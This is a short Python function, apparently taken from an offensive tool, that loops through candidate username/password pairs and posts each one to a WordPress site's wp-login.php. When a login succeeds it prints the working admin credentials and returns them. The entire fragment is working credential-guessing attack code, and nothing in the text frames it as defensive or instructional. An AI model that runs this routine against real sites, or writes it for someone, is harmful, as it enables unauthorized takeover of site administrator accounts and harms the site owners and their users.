def try_logins(target, http, candidates):
    t = target.rstrip("/")
    for c in candidates:
        if not c.get("pass"):
            continue
        try:
            http.session.get(t + "/wp-login.php")
            http.session.post(t + "/wp-login.php", data={
                "log": c["user"], "pwd": c["pass"],
                "wp-submit": "Log In",
                "redirect_to": t + "/wp-admin/",
                "testcookie": "1",
            }, allow_redirects=True)
            cookies = str(http.session.cookies)
            if "wordpress_logged_in" in cookies:
                print(f"[+] admin login: {c['user']}:{c['pass']}")
                return c
        except Exception:
            continue
    return None
